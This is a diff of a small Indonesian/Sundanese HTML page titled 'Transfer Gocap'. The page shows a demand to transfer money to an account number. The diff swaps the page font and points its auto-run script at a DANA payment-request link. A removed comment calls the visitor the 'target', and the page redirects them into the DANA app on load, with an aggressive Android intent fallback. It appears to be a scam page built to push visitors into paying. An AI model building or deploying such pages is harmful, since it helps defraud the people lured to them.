@@ -3,6 +3,10 @@
 <head>
     <title>Transfer Gocap</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- PERBAIKAN: Tautan Google Fonts sekarang sudah benar dan lengkap -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@800;900&display=swap" rel="stylesheet">
     <style>
         body {
             background-color: black;
@@ -12,7 +16,8 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            font-family: 'Courier New', Courier, monospace;
+            /* Menggunakan gaya font baru */
+            font-family: 'JetBrains Mono', monospace;
             font-size: 1.5rem;
             font-weight: 900; 
             overflow: hidden;
@@ -31,31 +36,36 @@
         .emoji-asli {
             -webkit-text-fill-color: initial !important;
         }
+        .petunjuk-loading {
+            font-size: 0.95rem; 
+            color: #888;
+            font-weight: 800;
+            display: inline-block;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="teks-sukses">
             Madep! Ditunggu Transferna Ieu No Rek Na:08815875598! <span class="emoji-asli">🙏😎</span>
-            <br><br>
-            <span style="font-size: 1rem; color: #888;">Membuka aplikasi DANA otomatis...</span>
+            <br>
+            <span class="petunjuk-loading">Membuka aplikasi DANA otomatis...</span>
         </div>
     </div>
 
     <script>
-        // Fungsi berjalan otomatis langsung saat halaman sukses dimuat oleh browser
         window.onload = function() {
-            // Jeda 800 milidetik agar target sempat membaca teks sebelum dilempar ke aplikasi DANA
             setTimeout(function() {
                 bukaDanaOtomatis();
             }, 800);
         };
 
         function bukaDanaOtomatis() {
-            // Memicu Deep Link/Universal Link DANA secara agresif
-            window.location.href = "https://dana.id";
+            // Mengarah langsung ke link Minta Uang DANA milikmu
+            window.location.href = "https://link.dana.id/minta?full_url=https://qr.dana.id/v1/281012092026061618414882";
             
-            // Sistem cadangan jika browser bawaan meminta skema Android intent alternatif
+            // Sistem cadangan agresif jika skema universal link utama tersendat di browser Android tertentu
             setTimeout(function() {
                 window.location.href = "intent://#Intent;scheme=dana;package=id.dana;end";
             }, 400);
